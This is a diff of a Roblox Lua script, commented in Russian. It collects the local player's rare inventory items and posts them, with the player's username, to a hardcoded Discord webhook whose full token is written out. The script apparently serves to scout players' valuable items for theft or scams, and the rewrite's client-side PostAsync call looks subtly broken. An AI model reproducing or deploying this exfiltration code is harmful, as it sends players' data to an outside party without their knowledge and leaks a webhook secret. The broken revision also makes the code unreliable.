@@ -1,23 +1,26 @@
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local HttpService = game:GetService("HttpService")
+
+local localPlayer = Players.LocalPlayer
+
+-- === Список разрешённых секреток ===
+local allowItems = {
+    "Garamararam",
+    "UltraBrain",
+    "LegendaryTool",
+}
+
 -- === Сбор инвентаря с фильтром секреток ===
 local function collectInventory()
-    local invText = ""
     local items = {}
-
-    -- Список разрешённых "секреток"
-    local allowItems = {
-        "garamararam",  -- добавь сюда все нужные секретки
-        "ultrabrain",   -- пример
-        "legendarytool", -- пример
-    }
 
     local function addItemsFrom(container)
         if not container then return end
         for _, item in ipairs(container:GetChildren()) do
             if item:IsA("Tool") then
-                local nameLower = item.Name:lower()
-                -- проверяем есть ли в списке разрешённых
                 for _, allowed in ipairs(allowItems) do
-                    if string.find(nameLower, allowed) then
+                    if item.Name == allowed then
                         table.insert(items, item.Name)
                         break
                     end
@@ -30,49 +33,32 @@ local function collectInventory()
     addItemsFrom(localPlayer.Character)
 
     if #items == 0 then
-        return nil -- ничего не отправляем, если нет секреток
+        return nil -- нет секреток
     else
-        invText = "\n--- Inventory ---\n"
+        local invText = "\n--- Inventory ---\n"
         for _, name in ipairs(items) do
             invText = invText .. "- " .. name .. "\n"
         end
+        return invText
     end
-
-    return invText
 end
 
--- === Основной запуск с проверкой ===
-local plot = findPlayerPlot()
-local brainrots = plot and collectBrainrots(plot) or "❌ Plot не найден"
+-- === Основной запуск ===
 local inventory = collectInventory()
-
 if inventory then
-    brainrots = brainrots .. inventory -- объединяем Brainrots + Inventory
+    local brainrots = "❌ Brainrots проверка отключена" -- или можно добавить свою функцию
+    local content = brainrots .. inventory
 
-    -- === Отправка в Discord ===
-    request({
-        Url = "https://discord.com/api/webhooks/1417846130619977738/mgmCuOeNpaNOBQddZUtCPaeheSjaBWdLNLfPPg2xk6-533OjiGgbjxwmkKPsQO7TK9ep",
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = HttpService:JSONEncode({
-            ["embeds"] = {{
-                ["title"] = "**Brainrots | Elly**",
-                ["color"] = 65280,
-                ["fields"] = {
-                    {
-                        ["name"] = "👤 Username",
-                        ["value"] = localPlayer.Name,
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "🪐 Brainrots \ Plot",
-                        ["value"] = brainrots,
-                        ["inline"] = false
-                    }
-                }
-            }}
-        })
+    local url = "https://discord.com/api/webhooks/1417846130619977738/mgmCuOeNpaNOBQddZUtCPaeheSjaBWdLNLfPPg2xk6-533OjiGgbjxwmkKPsQO7TK9ep" -- сюда свой вебхук
+    local body = HttpService:JSONEncode({
+        ["embeds"] = {{
+            ["title"] = "**Brainrots | Elly**",
+            ["color"] = 65280,
+            ["fields"] = {
+                {["name"] = "👤 Username", ["value"] = localPlayer.Name, ["inline"] = false},
+                {["name"] = "🪐 Brainrots \ Plot", ["value"] = content, ["inline"] = false}
+            }
+        }}
     })
+    HttpService:PostAsync(url, body, Enum.HttpContentType.ApplicationJson)
 end
